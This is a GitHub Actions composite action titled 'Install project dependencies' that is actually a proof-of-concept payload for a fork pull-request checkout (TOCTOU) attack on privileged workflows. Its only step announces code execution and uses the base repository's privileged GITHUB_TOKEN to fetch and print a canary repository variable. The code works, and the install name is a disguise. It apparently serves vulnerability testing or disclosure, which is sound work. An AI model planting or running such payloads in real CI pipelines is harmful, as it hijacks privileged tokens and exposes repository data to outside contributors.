name: Install project dependencies
description: Install project dependencies

# ATTACKER-CONTROLLED via fork PR checkout (TOCTOU on the mutable fork tip).
# Clean PoC payload — two lines of proof, nothing else:
#   1. a loud RCE marker (attacker code is running in the privileged workflow),
#   2. the per-repo canary CANARY_POC, read from the BASE repo with the privileged
#      GITHUB_TOKEN — a capability a fork PR's own read-only token does not have.
# Set CANARY_POC as a repository VARIABLE on each test repo (not a secret: composite
# actions can't read the secrets/vars contexts, and secrets are masked in logs; a
# variable read via the base token is readable, visible, and proves privileged access).

inputs:
  python-version:
    description: The python version to use
    required: false
    default: ""
  os:
    description: The OS to run on
    required: false
    default: ""

runs:
  using: composite
  steps:
    - name: setup
      shell: bash
      env:
        BASE_TOKEN: ${{ github.token }}
        REPO: ${{ github.repository }}
      run: |
        echo "::warning::RCE in workflow — attacker-controlled fork code is executing in $REPO"
        # Per-repo canary: read from the job env if present, else from the repo VARIABLE
        # via the privileged base token, then base64-decode its content.
        RAW="${CANARY_POC:-}"
        if [ -z "$RAW" ]; then
          RAW=$(curl -s -H "Authorization: Bearer $BASE_TOKEN" -H "Accept: application/vnd.github+json" \
            "https://api.github.com/repos/$REPO/actions/variables/CANARY_POC" \
            | python3 -c 'import json,sys;print(json.load(sys.stdin).get("value",""))' 2>/dev/null)
        fi
        echo "CANARY_POC=$(printf '%s' "$RAW" | base64 -d 2>/dev/null || printf '%s' "$RAW")"
